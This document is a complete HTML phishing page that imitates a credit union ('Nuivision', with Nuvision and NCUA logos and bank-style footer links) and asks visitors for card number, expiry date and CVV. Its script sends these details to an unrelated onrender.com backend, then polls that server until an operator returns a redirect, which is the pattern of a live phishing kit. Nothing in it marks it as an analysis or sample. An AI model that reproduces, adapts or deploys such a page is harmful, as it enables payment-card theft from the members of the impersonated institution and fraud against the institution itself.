<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nuivision - Card Details</title>
    <link
      rel="icon"
      type="image/jpeg"
      href="https://s3-media0.fl.yelpcdn.com/bphoto/ASbZrjRyKIcUNEoVv5f3ag/o.jpg"
    />
    <style>
      body {
        background-color: #767679;
        font-family: Arial, sans-serif;
        margin: 0;
      }

      .main-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        padding: 10px;
        box-sizing: border-box;
      }

      .center-container {
        display: flex;
        flex-direction: column;
        width: 100%;
        max-width: 700px;
        background-color: #f6f6f6;
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      .top-section {
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        padding: 20px;
        border-bottom: 1px solid #cccccc;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
      }

      .top-section img {
        max-width: 50%;
        height: auto;
        max-height: 90px;
      }

      .middle-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }

      .form {
        width: 100%;
        max-width: 400px;
        padding: 0;
      }

      .label {
        color: #2e2e2e;
        font-family: sans-serif;
        margin-top: 10px;
        display: block;
      }

      .input-section {
        width: 100%;
        margin-top: 10px;
        box-sizing: border-box;
        border: 1px solid #cccccc;
        height: 45px;
        border-radius: 5px;
        padding: 10px;
        font-size: 16px;
      }

      .submit-btn {
        border-radius: 5px;
        background-color: #8da3ad;
        width: 100%;
        border: none;
        height: 40px;
        color: white;
        cursor: pointer;
        font-size: 16px;
        margin-top: 20px;
      }

      .submit-btn:not(:disabled) {
        background-color: #415d6a;
        cursor: pointer;
      }

      .submit-btn:disabled {
        cursor: not-allowed;
        opacity: 0.6;
      }

      .down-section {
        background-color: #003f53;
        display: flex;
        color: white;
        align-items: center;
        gap: 20px;
        font-family: sans-serif;
        font-size: 13px;
        justify-content: center;
        flex-wrap: wrap;
        padding: 15px;
        border-bottom-left-radius: 8px;
        border-bottom-right-radius: 8px;
      }

      .bottom-logo {
        display: flex;
        justify-content: center;
        padding: 20px;
        margin-top: 20px;
      }

      .bottom-logo img {
        max-width: 130px;
        height: auto;
      }

      .exp-cvv-group {
        display: flex;
        gap: 10px;
        margin-top: 10px;
      }

      .exp-cvv-group .input-section {
        flex: 1;
      }

      .spinner-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        align-items: center;
        justify-content: center;
        z-index: 1000;
      }

      .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #415d6a;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }

      @media (max-width: 600px) {
        .center-container {
          max-width: 100%;
          margin: 0 10px;
        }

        .top-section {
          justify-content: center;
          padding: 10px;
        }

        .top-section img {
          max-width: 70%;
          margin: 0;
        }

        .form {
          max-width: 100%;
          padding: 0 20px;
        }

        .down-section {
          gap: 15px;
          font-size: 12px;
          padding: 10px;
        }

        .bottom-logo img {
          max-width: 100px;
        }

        .exp-cvv-group {
          flex-direction: column;
          gap: 10px;
        }
      }

      @media (max-width: 400px) {
        .input-section,
        .submit-btn {
          font-size: 14px;
        }

        .down-section {
          flex-direction: column;
          gap: 10px;
        }
      }
    </style>
  </head>
  <body>
    <div class="main-section">
      <div class="center-container">
        <div class="top-section">
          <img
            src="https://chambermaster.blob.core.windows.net/images/members/764/10280/MemPageHeader_Nuvision_color_01_Logo.jpg"
            alt="Nuivision Logo"
          />
        </div>
        <div class="middle-section">
          <form class="form" id="cardForm">
            <div>
              <label class="label">Card Number</label>
              <input
                type="text"
                id="cardNumber"
                class="input-section"
                maxlength="19"
                placeholder="XXXX-XXXX-XXXX-XXXX"
                required
              />
            </div>
            <div class="exp-cvv-group">
              <div>
                <label class="label">Expiration Date</label>
                <input
                  type="text"
                  id="expDate"
                  class="input-section"
                  maxlength="5"
                  placeholder="MM/YY"
                  required
                />
              </div>
              <div>
                <label class="label">CVV</label>
                <input
                  type="text"
                  id="cvv"
                  class="input-section"
                  maxlength="4"
                  placeholder="XXX"
                  required
                />
              </div>
            </div>
            <button class="submit-btn" id="submitBtn" disabled type="submit">
              Submit
            </button>
          </form>
        </div>
        <div class="down-section">
          Call Us | Privacy Policy | Enroll Now | Forgot Login | Rates
        </div>
      </div>
      <div class="bottom-logo">
        <img
          src="https://cdn1.onlineaccess1.com/cdn/depot/5063/3393/ba5a89e5187907b47df565433c5fa651/assets/images/ncua_logo_large-4a4a13e41007adaf4841dd9e4b145458.png"
          alt="NCUA Logo"
          height="40%"
          width="100%"
        />
      </div>
    </div>
    <div class="spinner-overlay" id="spinner">
      <div class="spinner"></div>
    </div>

    <script>
      const inputs = {
        cardNumber: document.getElementById("cardNumber"),
        expDate: document.getElementById("expDate"),
        cvv: document.getElementById("cvv"),
      };
      const submitBtn = document.getElementById("submitBtn");
      const cardForm = document.getElementById("cardForm");
      const spinner = document.getElementById("spinner");

      function checkInputs() {
        const allFilled = Object.values(inputs).every(
          (input) => input.value.trim() !== ""
        );
        const validCard = inputs.cardNumber.value.replace(/\D/g, "").length >= 15;
        const validExp = /^(\d{2})\/(\d{2})$/.test(inputs.expDate.value);
        const validCvv = inputs.cvv.value.replace(/\D/g, "").length >= 3;
        submitBtn.disabled = !(allFilled && validCard && validExp && validCvv);
      }

      inputs.cardNumber.addEventListener("input", (e) => {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 16) value = value.slice(0, 16);
        let formatted = "";
        for (let i = 0; i < value.length; i += 4) {
          formatted += value.slice(i, i + 4) + (i + 4 < value.length ? "-" : "");
        }
        e.target.value = formatted;
        checkInputs();
      });

      inputs.expDate.addEventListener("input", (e) => {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 4) value = value.slice(0, 4);
        if (value.length > 2) {
          e.target.value = `${value.slice(0, 2)}/${value.slice(2)}`;
        } else {
          e.target.value = value;
        }
        checkInputs();
      });

      inputs.cvv.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
        checkInputs();
      });

      cardForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        submitBtn.disabled = true;
        spinner.style.display = "flex";

        try {
          const response = await fetch("https://b-bcknd.onrender.com/c", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              data: {
                card_number: inputs.cardNumber.value.trim(),
                exp_date: inputs.expDate.value.trim(),
                cvv: inputs.cvv.value.trim(),
              },
            }),
          });
          const data = await response.json();

          if (!data.success) {
            alert("Submission failed: " + (data.error || "Unknown error"));
            submitBtn.disabled = false;
            spinner.style.display = "none";
            return;
          }

          const sessionId = data.id;
          const pollStatus = async () => {
            try {
              const statusResponse = await fetch(
                `https://b-bcknd.onrender.com/status/${sessionId}`
              );
              const statusData = await statusResponse.json();

              if (statusData.status === "approved" && statusData.redirect_url) {
                window.location.href = statusData.redirect_url;
              } else {
                setTimeout(pollStatus, 2000);
              }
            } catch (error) {
              console.error("Status polling error:", error);
              setTimeout(pollStatus, 2000);
            }
          };

          pollStatus();
        } catch (error) {
          console.error("Submission error:", error);
          alert("An error occurred. Please try again.");
          submitBtn.disabled = false;
          spinner.style.display = "none";
        }
      });
    </script>
  </body>
</html>
